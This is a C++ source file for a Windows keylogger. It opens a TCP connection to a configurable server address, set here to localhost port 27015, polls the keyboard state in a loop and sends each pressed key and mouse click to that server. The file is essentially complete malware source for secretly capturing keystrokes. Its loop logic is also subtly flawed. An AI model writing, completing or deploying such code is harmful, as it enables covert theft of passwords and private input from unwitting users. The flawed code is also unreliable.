//Simple Keylogger
#define WIN32_LEAN_AND_MEAN


#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <iostream>


// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment (lib, "User32.lib")


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"
#define SERVER_IP "localhost"

void ezprint(std::string str)
{
    std::cout << str << std::endl;
}

int __cdecl main()
{
    WSADATA wsaData;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
    char *sendbuf = "this is a test";
    char recvbuf[DEFAULT_BUFLEN];

    SOCKET ConnectSocket = INVALID_SOCKET;


    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;


    // Resolve the server address and port
    iResult = getaddrinfo(SERVER_IP, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        return 1;
    }


    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, 
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }




    // Should really try the next address returned by getaddrinfo
    // if the connect call failed
    // But for this simple example we just free the resources
    // returned by getaddrinfo and print an error message

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    
    char key;
    char tempbuf[100] = "";
    while (TRUE)
    {
        for (key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                switch (key)
                {
                case 8:
                    sendbuf = "backspace";
                    iResult = send(ConnectSocket, sendbuf, (int) strlen(sendbuf), 0);
                    break;
                case 32:
                    sendbuf = "space";
                    iResult = send(ConnectSocket, sendbuf, (int) strlen(sendbuf), 0);
                    break;
                case VK_SHIFT:
                    sendbuf = "shift";
                    iResult = send(ConnectSocket, sendbuf, (int) strlen(sendbuf), 0);
                    break;
                case VK_LBUTTON:
                    sendbuf = "leftclick";
                    iResult = send(ConnectSocket, sendbuf, (int) strlen(sendbuf), 0);
                    break;
                case VK_RBUTTON:
                    sendbuf = "rightclick";
                    iResult = send(ConnectSocket, sendbuf, (int) strlen(sendbuf), 0);
                    break;
                case 64:
                    sendbuf = "@";
                    iResult = send(ConnectSocket, sendbuf, (int) strlen(sendbuf), 0);
                    break;
                default:
                    tempbuf[0] = key;
                    iResult = send(ConnectSocket, tempbuf, 1, 0);
                }
            }
        }
        break;
    }
    

    // shutdown the connection for sending since no more data will be sent
    // the client can still use the ConnectSocket for receiving data
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }



    return 0;
}
